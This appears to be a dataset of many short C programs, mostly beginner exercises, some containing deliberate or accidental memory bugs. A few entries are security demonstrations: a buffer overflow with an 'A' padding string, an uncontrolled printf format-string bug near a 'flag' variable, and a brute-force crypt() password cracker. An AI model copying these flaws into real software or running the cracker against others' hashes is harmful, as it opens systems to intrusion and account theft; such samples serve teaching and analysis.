    "#include <stdio.h>\nint isprime (int a)\n{\n int f = 1;\n   if(a>2)\n    {\n     for(int i = 2; i < a; i++)\n        {\n         if(a % i == 0)\n            {\n             f=0;\n               break;\n            }\n        }\n    }\n   return f;\n}\nint main()\n{\n int n;\n   int v = 0;\n   scanf(\"%d\",&n);\n   for(int i = 2; i <= n-2; i++)\n    {\n  if(isprime(i) == 1 && isprime(i + 2)==1)\n        {\n         v++;\n        }\n    }\n    printf(\"%d\",v);\n    return 0;\n}",
    "#include <stdio.h>\n\nint leValidaTipo(){\n    int tipo;\n    do{\n  printf(\"\\ndigite o tipo do produto (1 - 2 - 3): \");\n  scanf(\"%d\",&tipo);\n    }while(tipo < 1 || tipo > 3);\n    return tipo;\n}\nvoid dadosProduto(int tipoProd ,float *perc,int *qtdMaxDes){\n    if (tipoProd == 1){\n       *perc = 1.5;\n       *qtdMaxDes = 100;\n       }\n      else if (tipoProd == 2){\n         *perc = 2.5;\n         *qtdMaxDes = 200;\n         }\n          else{\n           *perc = 3.5;\n           *qtdMaxDes = 300;\n           }\n}\nint main(){\n    int i, tipo, cod, qtdMaxDes;\n    float perc, preUni, novoPreco;\n    for(i = 0; i < 100; i++){\n    tipo = leValidaTipo();\n    printf(\"\\ninsira o pre\u00e7o da unidade: \");\n    scanf(\"%f\",&preUni);\n    dadosProduto(tipo, &perc, &qtdMaxDes);\n    printf(\"\\ninsira o codigo do produto: \");\n    scanf(\"%d\",&cod);\n    novoPreco = preUni + preUni * perc/100;\n  printf(\"\\ncodigo do produto: %d\", cod);\n  printf(\"\\ntipo do produto: %d\", tipo);\n  printf(\"\\nquantidade maxima desejada em estoque: %d\",qtdMaxDes);\n  printf(\"\\npre\u00e7o unitario atualizado: %.2fR$\", novoPreco);\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(int argc, char **argv) {\n  FILE *fd = fopen(\"/home/brendan/S/AoC/AoC-2021/Dec-2/input.txt\", \"r\");\n  char buff[100];\n  int depth = 0;\n  int pos = 0;\n  while (fgets(buff, 100, fd) != ((void*)0)) {\n    if (buff[0] == 'f') {\n      pos += atoi(&buff[8]);\n    }\n    if (buff[0] == 'u') {\n      depth -= atoi(&buff[3]);\n    }\n    if (buff[0] == 'd') {\n      depth += atoi(&buff[5]);\n    }\n  }\n  printf(\"depth: %d\\npos: %d\\nproduct: %d\\n\", depth, pos, depth * pos);\n  fclose(fd);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\n\n\nchar * char2ascii(char);\nint main(int argc, char * argv[]) {\n    char * res;\n    char input[20 +1];\n    int i;\n    scanf(\"%s\", input);\n    for(i=0; input[i]!='\\0'; i++) {\n        res = char2ascii(input[i]);\n        printf(\"%s\", res);\n    }\n    printf(\"\\n\");\n    return 0;\n}\nchar * char2ascii(char c) {\n    int v, i;\n    char * res;\n    if(res = malloc(sizeof(char) * (8 +1))) {\n        v = c;\n        for(i=0; i<8; i++) {\n            *(res+(8 -i-1)) = ((v%2) + '0');\n            v /= 2;\n        }\n        *(res+i) = '\\0';\n    }\n    return res;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nvoid input_array(int *arr, int n)\n{\n    int i;\n    for (i = 0; i < n; ++i)\n        scanf(\"%d\", &arr[i]);\n}\nvoid get_max_subarrays(int *arr, int n, int k)\n{\n    int i, j;\n    for (i = 0; i <= n-k; ++i)\n    {\n        int max = arr[i];\n        for (j = 1; j < k; ++j)\n        {\n            if (arr[i+j] > max)\n                max = arr[i+j];\n        }\n        printf(\"%d \",max);\n    }\n}\nint main()\n{\n    int n, *arr, k;\n    scanf(\"%d\", &n);\n    arr = (int*)malloc(n*sizeof(int));\n    input_array(arr, n);\n    scanf(\"%d\", &k);\n    get_max_subarrays(arr, n, k);\n    return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nchar* convert_2(int dec)\n{\n}\nint main() {\n int n;\n char * bin;\n printf(\"Enter the Decimal Number\\n\");\n scanf(\"%d\",&n);\n bin = convert_2(n);\n printf(\"The Binary Notation of %d is\\t %s\\n\", n, bin);\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n    int rod,tot=0;\n    scanf(\"%d\", &rod);\n    int vet[rod];\n    for(int cont =0; cont < rod; cont++){\n        scanf(\"%d\", &vet[cont]);\n    }\n    for(int cont = 0; cont < (rod - cont -1); cont++){\n        tot += pow((vet[cont] - vet[rod - cont -1]),2);\n    }\n    printf(\"%d\", tot);\n    return 0;\n}",
    "char *(cstrcpy)(char *s1, const char *s2)\n {\n     char *dst = s1;\n     const char *src = s2;\n     while ((*dst++ = *src++) != '\\0')\n         ;\n     return s1;\n }\nint main() {\n  char* s2;\n  char* s1;\n  cstrcpy(s1, s2);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int j,k;\n  int c = getchar();\n  for(j=0,c=0; (c!=(-1)); j++) {\n    if(j % (1024*1024) == 0)\n      printf(\"Received %0d MB\\n\", j/(1024*1024));\n    if(((unsigned char) c) != ((unsigned char) j)) {\n      printf(\"Diff byte 0x%08x  got 0x%02x\\n\", j, c);\n      c = getchar();\n      for(k=0; (k<16) && (c!=(-1)); k++) {\n printf(\"0x%08x  got 0x%02x\\n\", j, c);\n j++;\n c = getchar();\n      }\n      c = (-1);\n    } else\n      c = getchar();\n  }\n  printf(\"Checked %d MB = %d = 0x%08x\\n\", j / (1024*1024), j, j);\n  return 0;\n}",
    "#include<stdio.h>\nint lower(int);\nint main(){\n int uc,lc;\n uc=getchar();\n lc=lower(uc);\n printf(\"lc=%c\\n\",lc);\n return 0;\n}\nint lower(int c){\n if(c>='A'&&c<='Z')\n  return c-'A'+'a';\n else\n  return c;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <ctype.h>\n#include <string.h>\nvoid swap(char *a, char *b)\n{\n *a ^= *b;\n *b ^= *a;\n *a ^= *b;\n}\nvoid reverse(char *str, int s, int t)\n{\n int i = s, j = t;\n while (i < j)\n  swap(&str[i++], &str[j--]);\n}\nchar *compress(char *s)\n{\n if (s == ((void*)0))\n  return ((void*)0);\n int n = strlen(s);\n int i = 0;\n int j = n - 1;\n while (isblank(s[i])) i++;\n while (isblank(s[j])) j--;\n int k;\n for (k = 0; i <= j; ++i) {\n  if (!isblank(s[i]) || (i > 0 && !isblank(s[i - 1]))) {\n   s[k++] = s[i];\n  }\n }\n s[k] = 0;\n return s;\n}\nvoid reverseWords(char *s)\n{\n if (s == ((void*)0))\n  return;\n compress(s);\n int n = strlen(s);\n if (n <= 1)\n  return;\n reverse(s, 0, n - 1);\n int pos = 0;\n for (int i = 0; i < n; ++i) {\n  if (isblank(s[i])) {\n   reverse(s, pos, i - 1);\n   pos = i + 1;\n  }\n }\n reverse(s, pos, n - 1);\n}\nint main(int argc, char **argv)\n{\n char s1[] = \"the sky is blue\";\n char s2[] = \"     the    sky is    blue      \";\n char s3[] = \" \";\n char s4[] = \"pz! .xwy.,cga. vua frjrmcjf, xxw'izz vgthvpfhl sldudifok wvls orujxroi w. oo c?ymxlptr ff'?rh bsjjoyjwvx tj pqv.zlq ,jlu',j dg izq.fo wtvwqn teual jnsv.a .oclyrvg tkgag'a' !wsz?sclc pvhl.ypq vyin cn?z,kxg , u l?l glr zf'hew l'wmi .nlvgr u zfwzra? ot!emgg. rg,'.d.kp fn vat ba.myfqxe znzdrhh xjeubr taztndst v nep?bs .,pwin. e pi\";\n reverseWords(s1);\n reverseWords(s2);\n reverseWords(s3);\n reverseWords(s4);\n printf(\"'%s'\\n\", s1);\n printf(\"'%s'\\n\", s2);\n printf(\"'%s'\\n\", s3);\n printf(\"'%s'\\n\", s4);\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n int x, y;\n scanf(\"%d\", &x);\n scanf(\"%d\", &y);\n do{\n  if(x>y){\n   printf(\"Decrescente\\n\");\n  }\n  else{\n   printf(\"Crescente\\n\");\n  }\n  scanf(\"%d %d\\n\", &x, &y);\n }while(x != y);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\n\nlong long int quotient(long long int a, long long int b){\n  if (b == 0) {\n    return -1;\n  } else if ((a == (-pow(2, 4 - 1))) & (b == -1)) {\n    return a;\n  } else {\n    return a / b;\n  }\n}\nlong long int rem(long long int a, long long int b){\n  if (b == 0) {\n    return a;\n  } else if ((a == (-pow(2, 4 - 1))) & (b == -1)) {\n    return 0;\n  } else {\n    return a % b;\n  }\n}\nint main(){\n  FILE *file_in, *file_out;\n  long long int dividend, divisor, remain, quot;\n  file_in = fopen(\"s.txt\", \"r\");\n  file_out = fopen(\"s_expected.txt\", \"w\");\n  for (int i = 0; i < 1 << (4 * 2); i ++) {\n    fscanf(file_in, \"%lld\", &dividend);\n    fscanf(file_in, \"%lld\", &divisor);\n    quot = quotient(dividend, divisor);\n    remain = rem(dividend, divisor);\n    fprintf(file_out, \"%lld %lld %lld %lld\\n\", dividend, divisor, quot, remain);\n  }\n  fclose(file_in);\n  fclose(file_out);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdint.h>\n\nint32_t foo(int32_t a, int32_t b, int32_t c) {\n    putchar(a);\n    putchar(b);\n    putchar(c);\n    return b;\n}\nint32_t main() {\n    foo('a', 'b', '\\n');\n    return 0;\n}",
    "#include    <stdio.h>\n#include    <unistd.h>\n#include    <stdlib.h>\nint main(void)\n{\n    printf(\"\\a \u041f\u0440\u043e\u0437\u0432\u0443\u0447\u0438\u0442 \u0441\u0438\u0441\u0442\u0435\u043c\u043d\u044b\u0439 \u0437\u0432\u043e\u043d\u043e\u043a, \u0435\u0441\u043b\u0438 \u0435\u0441\u0442\u044c \u0432 \u043a\u043e\u043c\u043f\u0435 \u043f\u0438\u0449\u0430\u043b\u043a\u0430.\");\n    printf(\"\u0421\u0442\u0440\u043e\u043a\u0430 \u0431\u0443\u0434\u0435\u0442 \u043f\u0435\u0440\u0435\u0432\u0434\u0435\u043d\u0430 \u043d\u0430\\n \u0441\u043b\u0435\u0434\u0443\u044e\u0449\u0443\u044e \u0441\u0442\u0440\u043e\u043a\u0443\\n\");\n    return (0);\n}",
    "#include<stdio.h>\nint main ( void ) {\n    int n;\n    printf(\"Digite um numero: \");\n    scanf(\"%d\", &n);\n    if(n % 2 == 0) printf(\"Par\");\n    else printf(\"impar\");\n}",
    "#include<stdio.h>\nint f[50], i, k, j, inde[50], n, c, count=0, p;\nint main()\n{\n    for(i = 0; i < 50; i++)\n        f[i] = 0;\n    x:\n        printf(\" Enter index block: \");\n        scanf(\"%d\", &p);\n    if(f[p] == 0)\n    {\n        f[p] = 1;\n        printf(\" Enter number of files on index: \");\n        scanf(\"%d\", &n);\n    }\n    else {\n        printf(\" Block already allocated\\n\");\n        goto x;\n    }\n    printf(\" Enter values: \\n\");\n    for(i = 0; i < n; i++)\n        scanf(\"%d\", &inde[i]);\n    for(i=0;i<n;i++)\n        if(f[inde[i]] == 1)\n        {\n            printf(\" ERR: Block already allocated\");\n            goto x;\n        }\n    for(j = 0; j < n; j++)\n        f[inde[j]] = 1;\n    printf(\"\\n Allocated: \");\n    printf(\"\\n File indexed: \");\n    for(k = 0; k < n; k++)\n        printf(\"\\n%d -> %d:%d\", p, inde[k], f[inde[k]]);\n    printf(\" Press 1 to enter more files \\n 0 to exit\\t\");\n    scanf(\"%d\", &c);\n    if(c == 1)\n        goto x;\n    else\n        return(0);\n}",
    "#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n\n\n\n\n\nint main(int argc, char** argv) {\n uint64_t* ptr1 = (uint64_t*)malloc(sizeof(uint64_t));\n *ptr1 = 1735;\n uint64_t* taggedPtr = (uint64_t*)( ((uintptr_t)0xAC) << 56 );\n printf(\"tag: %p\\n\", taggedPtr);\n taggedPtr = (uint64_t*)((uintptr_t)ptr1 | (uintptr_t)taggedPtr);\n printf(\"Ptr1: %p\\n\", ptr1);\n printf(\"taggedPtr: %p\\n\", taggedPtr);\n printf(\"%ld\\n\", *ptr1);\n printf(\"%ld\\n\", *(uint64_t*)((uintptr_t)taggedPtr & (uintptr_t)0x00ffffffffffffff));\n printf(\"The tag is %x\\n\", (uint8_t)( ((uintptr_t)taggedPtr & ~0x00ffffffffffffff) >> 56 ));\n free(ptr1);\n return 0;\n}",
    "#include <stdio.h>\ndouble fact( int n );\nint main(void)\n{\n    int i;\n    double sum;\n    sum = 0;\n    for(i = 1; i <= 10; i++)\n        sum = sum + fact(i);\n    printf(\"1!+2!+...+10! = %f\\n\", sum);\n    return 0;\n}\ndouble fact( int n ){\n int i;\n int pow = 1;\n for(i=1;i<n+1;i++){\n  pow = pow*i;\n }\n return pow;\n}",
    "#include <stdio.h>\nint main()\n{\n    long long int N,p,a,sum,j;\n    while(scanf(\"%lld\",&N)!=(-1))\n    {\n        if(N<0)\n            break;\n        p=1;\n        sum=0;\n        for(j=1;N!=0;j++)\n        {\n            a=N%3;\n            sum=sum + (a*p);\n            N=N/3;\n            p=p*10;\n        }\n        printf(\"%lld\\n\",sum);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n  int n, i = 0, j;\n  int NeCh[1000];\n  scanf(\"%d\", &n);\n  while(i < n){\n    scanf(\"%d\", &NeCh[i]);\n    if(NeCh[i] % 2 != 0){\n      i++;\n    }\n  }\n  i--;\n  for(j = 0;j < n / 2;j++){\n    NeCh[j] = NeCh[j] - NeCh[i];\n    i--;\n  }\n  if(n%2 == 0){\n    for(i = 0;i < j;i++){\n        printf(\"%d\\n\", NeCh[i]);\n    }\n  }else{\n    for(i = 0;i <= j;i++){\n        printf(\"%d\\n\", NeCh[i]);\n    }\n  }\n  return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid payment(char *name, double amount_cny, char *purpose, int purpose_len)\n{\n    double amount_usd = amount_cny / 6.466;\n    char memo[40];\n    strcpy(memo, \"Payment for: \");\n    memcpy(memo + strlen(memo), purpose, purpose_len);\n    printf(\"address of amount_usd: %p\\naddress of memo: %p\\n\", &amount_usd, memo);\n    printf(\"purpose_len: %d\\n\", purpose_len);\n    printf(\"amount_usd: %f\\npurpose: %s\\n\", amount_usd, purpose);\n    return;\n}\nint main()\n{\n    char name[] = \"username\";\n    double amount_cny = 646.60;\n    char purpose[] = \"\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\\x41\";\n    int purpose_len = strlen(purpose);\n    payment(name, amount_cny, purpose, purpose_len);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    void inv(int x[], int n);\n    int i, a[10] = {3, 7, 9, 11, 0, 6, 7, 5, 4, 2};\n    printf(\"The original array:\\n\");\n    for (i = 0; i < 10; i++)\n    {\n        printf(\"%d \", a[i]);\n    }\n    printf(\"\\n\");\n    inv(a, 10);\n    printf(\"The array has been inverted:\\n\");\n    for (i = 0; i < 10; i++)\n    {\n        printf(\"%d \", a[i]);\n    }\n    printf(\"\\n\");\n    return 0;\n}\nvoid inv(int x[], int n)\n{\n    int temp, i, j, m = (n - 1) / 2;\n    for (i = 0; i <= m; i++)\n    {\n        j = n - 1 - i;\n        temp = x[i];\n        x[i] = x[j];\n        x[j] = temp;\n    }\n}",
    "#include <stdio.h>\nvoid mer(int a[],int l,int m,int r)\n{\n int n1=m-l+1;\n int n2=r-m;\n int l1[n1],l2[n2];\n int i;\n for(i=0;i<n1;i++)\n  l1[i]=a[l+i];\n for(i=0;i<n2;i++)\n  l2[i]=a[m+1+i];\n int j=0,k=l;\n i=0;\n while(i<n1 && j<n2)\n {\n  if(l1[i]>=l2[j])\n   {\n    a[k]=l2[j];\n    j++;\n   }\n  else\n  {\n   a[k]=l1[i];\n   i++;\n  }\n  k++;\n }\n while(i<n1)\n  a[k++]=l1[i++];\n while(j<n2)\n  a[k++]=l2[j++];\n}\nvoid mergesort(int a[],int l,int r)\n{\n if(l<r)\n {\n  int mid=(l+r)/2;\n  mergesort(a,l,mid);\n  mergesort(a,mid+1,r);\n  mer(a,l,mid,r);\n }\n}\nvoid display(int a[],int n)\n{\n int i;\n for(i=0;i<n;i++)\n  printf(\"%d \",a[i]);\n printf(\"\\n\");\n}\nvoid search(int a[],int l,int h,int q,int n)\n{\n if(q<a[0])\n {\n  printf(\"%d\\n\",n);\n  return ;\n }\n if(q>=a[n-1])\n {\n  printf(\"0\\n\");\n  return ;\n }\n int mid;\n while((h-l)>1)\n {\n  mid=(l+h)/2;\n  if(a[mid]<=q)\n   l=mid;\n  else\n   h=mid-1;\n }\n if(a[h]>q)\n  printf(\"%d\\n\",n-h);\n else\n  printf(\"%d\\n\",n-h-1);\n}\nint main()\n{\n int n;\n scanf(\"%d\",&n);\n int l[n];\n int i;\n for(i=0;i<n;i++)\n  scanf(\"%d\",&l[i]);\n int m;\n scanf(\"%d\",&m);\n int q;\n mergesort(l,0,n-1);\n while(m)\n {\n  scanf(\"%d\",&q);\n  search(l,0,n-1,q,n);\n  m--;\n }\n return 0;\n}",
    "int main()\n{\n     int marks[10], i, n, sum = 0, average;\n     int *a,*b;\n     for(i=0; i<n; i++ ){\n          sum += marks[++i];\n     }\n     average = sum/n;\n     a = b + 2;\n     return 0;\n}",
    "#include <stdio.h>\n\n\n\nint main(void);\nint\nmain(void)\n{\n    int c, cc, i, j, nw, state;\n    int wordlength[15];\n    int wordlen;\n    state = 0;\n    cc = nw = wordlen = 0;\n    for(i = 0; i < 15; i++)\n        wordlength[i] = 0;\n    while ((c = getchar()) != (-1)) {\n        cc++;\n     if (cc > wordlen)\n      wordlen = cc;\n        if (c == ' ' || c == '\\n' || c == '\\t') {\n            wordlength[cc - 1]++;\n            state = 0;\n            cc = 0;\n        }\n        else if (state == 0) {\n            state = 1;\n            ++nw;\n        }\n    }\n    printf(\"Vertical Histogram of Word Lengths\\n\");\n    for(i = 1; i < wordlen; i++)\n    {\n     for(j = 1; j < wordlen; j++)\n     {\n  if (wordlength[j] >= i)\n             printf(\"#\");\n      else\n          printf(\" \");\n         }\n     printf(\"\\n\");\n    }\n    printf(\"Done\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main (){\nint n, prod=1, x;\nscanf(\"%i\", &n);\nfor(x=1 ; x<=n; x++){\n  printf(\"%d\\n\", x);\n  prod= prod*x;\n}\nprintf(\"\\nO FATORIAL E: %d\\n\", prod);\n}",
    "#include <stdio.h>\nint main()\n{\n    unsigned int fat = 1, n;\n    scanf(\"%d\", &n);\n    while (n > 0) {\n        fat *= n--;\n    }\n    printf(\"%d\\n\", fat);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n    int distance = 100;\n    int b = 249;\n    int m = 4;\n    int x = 42;\n    printf(\"You are %d miles away.\\n\", distance);\n    printf(\"M %d.\\n\", m * x + b);\n    return 0;\n}",
    "#include<stdio.h>\nint N(int l,int r,int A[200]);\nint M(int l,int r,int A[200],int n);\nint H(int l,int r,int A[200]);\nint main(){\n int n,k,i,max,min,l,r;\n int A[200],a[200];\n scanf(\"%d%d\",&n,&k);\n for(i=0;i<n;i++){\n  scanf(\"%d\",&A[i]);\n }\n for(i=0;i<k;i++){\n  scanf(\"%d%d\",&l,&r);\n  if((N(l,r,A))%n>(M(l,r,A,n))%n){\n   max=(N(l,r,A))%n;\n   min=(M(l,r,A,n))%n;\n  }\n  else{\n   max=(M(l,r,A,n))%n;\n   min=(N(l,r,A))%n;\n  }\n  a[i]=H(min,max,A);\n }\n for(i=0;i<k;i++){\n printf(\"%d\\n\",a[i]);\n }\n}\nint N(int l,int r,int A[]){\n int sum=0;\n while(l<=r){\n  sum=sum+A[l];\n  l++;\n }\n return sum;\n}\nint M(int l,int r,int A[],int n){\n int ji=1;\n while(l<=r){\n  ji=(ji*A[l])%n;\n  l++;\n }\n return ji;\n}\nint H(int l,int r,int A[]){\n int m;\n m=A[l];\n while((l+1)<=r){\n  m=m^A[l+1];\n  l++;\n }\n return m;\n}",
    "#include <stdio.h>\nint get_gcd(int a, int b)\n{\n return b ? (get_gcd(b, a % b)) : a;\n}\nint get_lcm(int a, int b, int c)\n{\n return a * b / c;\n}\nint main(void)\n{\n int x, y, gcd;\n scanf(\"%d %d\", &x, &y);\n gcd = get_gcd(x, y);\n printf(\"%d\\n\",gcd);\n printf(\"%d\", get_lcm(x, y, gcd));\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n  int a, b, c;\n  printf(\"Wprowad\u017a trzy liczby ca\u0142kowite: \\n\");\n  scanf(\"%d %d %d\", &a, &b, &c);\n  printf(\"Suma wynosi: %d\\n\", a + b + c);\n  printf(\"Iloczyn wynosi: %d\\n\", a * b * c);\n  if (a < b && a < c) {\n    printf(\"Najmniejsza liczba to: %d\\n\", a);\n  }\n  else if (b < a && b < c) {\n    printf(\"Najmniejsza liczba to: %d\\n\", b);\n  }\n  else {\n    printf(\"Najmniejsza liczba to: %d\\n\", c);\n  }\n  if (a > b && a > c) {\n    printf(\"Najwi\u0119ksza liczba to: %d\\n\", a);\n  }\n  else if (b > a && b > c) {\n    printf(\"Najwi\u0119ksza liczba to: %d\\n\", b);\n  }\n  else {\n    printf(\"Najwi\u0119ksza liczba to: %d\\n\", c);\n  }\n  return 0;\n}",
    "#include<stdio.h>\nint main(){\n  int number;\n  read:scanf(\"%d\",&number);\n  if(number%2==0){\n    printf(\"even\\n\");\n    goto read;\n    }\n  else printf(\"odd\\n\");\n  goto read;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nfloat salario=1000,aumento;\nint i=1997;\nint main()\n{\n    printf(\"Salario em 1995 = %f\",salario);\n    aumento=salario*0.015;\n    printf(\"\\nAumento em 1996: %f\",aumento+salario);\n    do\n    {\n        aumento=aumento*2;\n        printf(\"\\nSalario em %d: R$%f\",i,salario+aumento);\n        i=i+1;\n    }\n    while(i<=2019);\nreturn 0;\n}",
    "#include <string.h>\n#include <stdio.h>\nint main()\n{\n    char nama1[100] = { 'K', 'u', 's','u','m','a'};\n    printf(\"%s\\n\", nama1);\n    char *nama2 = \"Irianto bgst\";\n    printf(\"%s\\n\", nama2);\n    char nama3[100];\n    strcpy(nama3, \"Ni Wayan Rage Seduk\");\n    printf(\"%s\\n\", nama3);\n}",
    "#include <stdlib.h>\nint main(void){\n char a[5] = \"abc\";\n char* p = realloc(a, 5);\n p[0];\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int nums[2][2]={{1,2},{3,4}};\n    int* p=nums[0];\n    printf(\"%d  %d\",*p,*(p+1));\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, char **argv)\n{\n    char text[1024];\n    char flag[] = \"AAAA\";\n    printf(\"Whats your Name Mr plumber: \");\n    fgets(text, 1024 , (stdin));\n    printf(\"Hello  there \");\n    printf(text);\n    printf(\"\\n\");\n    return(0);\n}",
    "#include <stdio.h>\nint main() {\n    printf(\"------------------------------------\\n\");\n    printf(\"Province      Area(km2)   Pop.(10K)\\n\");\n    printf(\"------------------------------------\\n\");\n    printf(\"Anhui         139600.00   6461.00\\n\");\n    printf(\"Beijing        16410.54   1180.70\\n\");\n    printf(\"Chongqing      82400.00   3144.23\\n\");\n    printf(\"Shanghai        6340.50   1360.26\\n\");\n    printf(\"Zhejiang      101800.00   4894.00\\n\");\n    printf(\"------------------------------------\\n\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nvoid compute(double comp, int var_1,double var_2,double var_3,double var_4,double var_5,double var_6,double var_7,double var_8,double var_9,double var_10) {\n long double comp_H = comp;\n long double var_2_H = var_2;\n long double var_3_H = var_3;\n long double var_4_H = var_4;\n long double var_5_H = var_5;\n long double var_6_H = var_6;\n long double var_7_H = var_7;\n long double var_8_H = var_8;\n long double var_9_H = var_9;\n long double var_10_H = var_10;\nfor (int i=0; i < var_1; ++i) {\n  comp_H = var_2_H / -1.5625E-307 / -0.0 * -0.0;\n  printf(\"%.17Lg\\n\", comp_H);\ncomp_H += +0.0 - var_3_H - (var_4_H + var_5_H);\ncomp_H += powl(var_6_H * (var_7_H - var_8_H), +1.4347E-317 + var_9_H + log10l((-1.5649E-306 / (var_10_H * (-1.2860E-307 / (-1.3199E-306 * +1.0495E238))))));\n}\n  printf(\"%.17Lg\\n\", comp_H);\n}\ndouble* initPointer(double v) {\n  double *ret = (double*) malloc(sizeof(double)*10);\n  for(int i=0; i < 10; ++i)\n    ret[i] = v;\n  return ret;\n}\nint main(int argc, char** argv) {\n  double tmp_1 = atof(argv[1]);\n  int tmp_2 = atoi(argv[2]);\n  double tmp_3 = atof(argv[3]);\n  double tmp_4 = atof(argv[4]);\n  double tmp_5 = atof(argv[5]);\n  double tmp_6 = atof(argv[6]);\n  double tmp_7 = atof(argv[7]);\n  double tmp_8 = atof(argv[8]);\n  double tmp_9 = atof(argv[9]);\n  double tmp_10 = atof(argv[10]);\n  double tmp_11 = atof(argv[11]);\n  compute(tmp_1,tmp_2,tmp_3,tmp_4,tmp_5,tmp_6,tmp_7,tmp_8,tmp_9,tmp_10,tmp_11);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    unsigned int i;\n    for (i = 10; i >= 0; --i) {\n        printf(\"%d\\n\", i);\n    }\n}",
    "#include <stdio.h>\n int num1=1;\nint main() {\n  int num2=10;\n  printf(\"%d\\n\",num1);\n  printf(\"%d\\n\",num2);\n }",
    "#include <stdio.h>\nint main() {\n    int q=0;\n    scanf(\"%d\",&q);\n    double matriz[3]={0,0,0};\n    for(int i=0;i<q;i++){\n        char u=' ';\n        double quantidade=0;\n        scanf(\"%lf %c\",&quantidade,&u);\n        switch (u) {\n            case 'C':\n                matriz[0]+=quantidade;\n                break;\n            case 'R':\n                matriz[1]+=quantidade;\n                break;\n            case 'S':\n                matriz[2]+=quantidade;\n                break;\n            default:\n                break;\n        }\n    }\n    int total=0;\n    int i=0;\n    for(i=0;i<3;i++) total+=matriz[i];\n    total=(total==0)?1:total;\n    printf(\"Total: %d cobaias\\n\",total);\n    printf(\"Total de coelhos: %.0lf\\n\",matriz[0]);\n    printf(\"Total de ratos: %.0lf\\n\",matriz[1]);\n    printf(\"Total de sapos: %.0lf\\n\",matriz[2]);\n    printf(\"Percentual de coelhos: %.2lf %%\\n\",matriz[0]*100.00/total);\n    printf(\"Percentual de ratos: %.2lf %%\\n\",matriz[1]*100.00/total);\n    printf(\"Percentual de sapos: %.2lf %%\\n\",matriz[2]*100.00/total);\n    return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar word[5] = {0, 0, 0, 0};\nchar hash[20];\nchar salt[2];\nvoid match (void);\nvoid shift(int n, int i);\nint main (int args, char *argv[]) {\n    if (args != 2) {\n        printf(\"Usage: ./crack hash\\n\");\n        return 1;\n    }\n    strcpy(hash, argv[1]);\n    strncpy(salt, hash, 2);\n    int a, b, c, d;\n    for (a = 0; a < 52; a++){\n        for (b = 0; b < 52; b++){\n            for (c = 0; c < 52; c++){\n                for (d = 0; d < 52; d++){\n                    shift(0, d);\n                }\n                shift(1, c);\n            }\n            shift(2, b);\n        }\n        shift(3, a);\n    }\n    return 0;\n}\nvoid shift(int n, int i){\n    if (i <= 25){\n        i += 65;\n    } else {\n        i += 71;\n    }\n    word[n] = i;\n    match();\n}\nvoid match (void) {\n    if (strcmp(crypt(word, salt), hash) == 0){\n        printf(\"%s\\n\", word);\n        exit(0);\n    }\n}",
    "#include <stdio.h>\nint main()\n{\n    int n, i, max=0, cnt=0, trac=0, x;\n    scanf(\"%d\", &n);\n    for(i=0; i<n; i++)\n    {\n        scanf(\"%d\", &x);\n        if(x>trac)\n        {\n            cnt++;\n        }\n        else\n        {\n            if(max<cnt) max=cnt;\n            cnt=1;\n        }\n        trac=x;\n    }\n    if(max<cnt) max=cnt;\n    printf(\"%d\\n\", max);\n    return 0;\n}",
    "#include <stdio.h>\nint generate_paths(unsigned char c);\nint main(int argc, char **argv) {\n  generate_paths('a');\n  generate_paths('A');\n  generate_paths('x');\n  generate_paths('d');\n  generate_paths('0');\n  generate_paths('G');\n  generate_paths('a');\n  generate_paths('z');\n  generate_paths('i');\n  generate_paths('9');\n}\nint generate_paths(unsigned char c) {\n  if (c < 128) {\n    if (c < 64) {\n      if (c < 32) {\n if (c < 16) {\n   printf(\"path 1\\n\");\n } else {\n   printf(\"path 2\\n\");\n }\n      } else {\n if (c < 48) {\n   printf(\"path 3\\n\");\n } else {\n   printf(\"path 4\\n\");\n }\n      }\n    } else {\n      if (c < 96) {\n if (c < 80) {\n   printf(\"path 5\\n\");\n } else {\n   printf(\"path 6\\n\");\n }\n      } else {\n if (c < 112) {\n   printf(\"path 7\\n\");\n } else {\n   printf(\"path 8\\n\");\n }\n      }\n    }\n  } else {\n    if (c < 192) {\n      if (c < 160) {\n if (c < 144) {\n   printf(\"path 9\\n\");\n } else {\n   printf(\"path 10\\n\");\n }\n      } else {\n if (c < 176) {\n   printf(\"path 11\\n\");\n } else {\n   printf(\"path 12\\n\");\n }\n      }\n    } else {\n      if (c < 224) {\n if (c < 208) {\n   printf(\"path 13\\n\");\n } else {\n   printf(\"path 14\\n\");\n }\n      } else {\n if (c < 240) {\n   printf(\"path 15\\n\");\n } else {\n   printf(\"path 16\\n\");\n }\n      }\n    }\n  }\n  return 0;\n}",
